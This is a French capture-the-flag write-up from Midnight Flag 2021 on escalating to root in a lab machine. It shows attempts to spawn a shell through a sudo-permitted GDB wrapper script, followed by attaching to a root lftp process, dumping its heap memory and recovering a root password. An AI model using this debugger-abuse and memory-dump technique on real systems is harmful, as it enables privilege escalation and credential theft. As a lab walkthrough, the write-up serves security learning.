# Route Moi - root
## Présentation

Il faut maintenant élever ses privilèges jusqu'à root.

Ce challenge a été mon coup de coeur du Midnight Flag 2021 ! :) 

**Catégorie :** Réaliste  
**Points :** 350

## Résolution

On profite d'avoir le pass de meltheboss pour s'ouvrir un petit SSH bien confort.  
Premier reflex de reconaissance : `sudo -l`

On découvre alors qu'on a les droits sudo pour un fichier (dont je n'ai plus le nom exact) `/usr/lib/execute.py`.  
Quand on lance ce fichier, un prompt nous demande d'indiquer un fichier à exécuter.

On pourrait imaginer qu'il s'agit donc d'un script qui ferait un eval() sur un autre fichier python.  
On se crée donc un fichier de test dans `/tmp` :

```
➜  echo 'print(1)' > /tmp/test.py
```

Lorsqu'on essaye de l'importer, le programme nous répond que le fichier doit respecter la syntaxe :

```
import gdb
gdb.execute('attach x')
gdb.execute('i a r')
gdb.execute('quit')
```

Il semblerait donc qu'on soit conffronté à une librairie pyton qui execute des commandes dans GDB.  
Ma première idée était de voir si on pouvait se spawn un petit shell :

```
gdb.execute('!sh')
gdb.execute('!bash')
gdb.execute('shell')
gdb.execute('python import pty; pty.spawn("/bin/sh")')
gdb.execute('python')
gdb.execute('python-interactive')
```

Mais sans succès. Mon attention a donc été attirée par la première ligne du script d'exemple qui parle d'attacher un processus (`attach x`). Comme rien n'est jamais là par hasard, on fait un petit tour dans les processus et on découvre en effet un lftp qui tourne avec les droits root et le pid `562`.

Nouvelle idée : attacher ce processus et essayer de voir si on peut pas retrouver un mot de passe dans la mémoire.

On se construit donc un nouvel exploit :

```
import gdb
gdb.execute('attach 562')
gdb.execute('info proc mappings')
```

qui fonctionne à merveille et nous donne nos adresses mémoire :

```
Mapped address spaces:

Start Addr           End Addr       Size     Offset objfile
0x55e8db79a000     0x55e8db8e9000   0x14f000        0x0 /usr/bin/lftp
0x55e8dbae9000     0x55e8dbaf2000     0x9000   0x14f000 /usr/bin/lftp
0x55e8dbaf2000     0x55e8dbaf8000     0x6000   0x158000 /usr/bin/lftp
0x55e8dbaf8000     0x55e8dbafa000     0x2000        0x0 

0x55e8dd0c5000     0x55e8dd144000    0x7f000        0x0 [heap]
```

On peut maintenant exporter le contenu de notre heap :

```
import gdb
gdb.execute('attach 562')
gdb.execute('dump memory out 0x55e8dd0c5000 0x55e8dd144000')
```

La commande `strings` n'est pas installée sur le serveur, on fait donc un scp pour récupérer le fichier `out` en local et après un petit parcours manuel on retrouve notre mot de passe : `th3sup3rr00tp4ssw0rd`.

Le flag se trouve dans `/root/flag.txt`.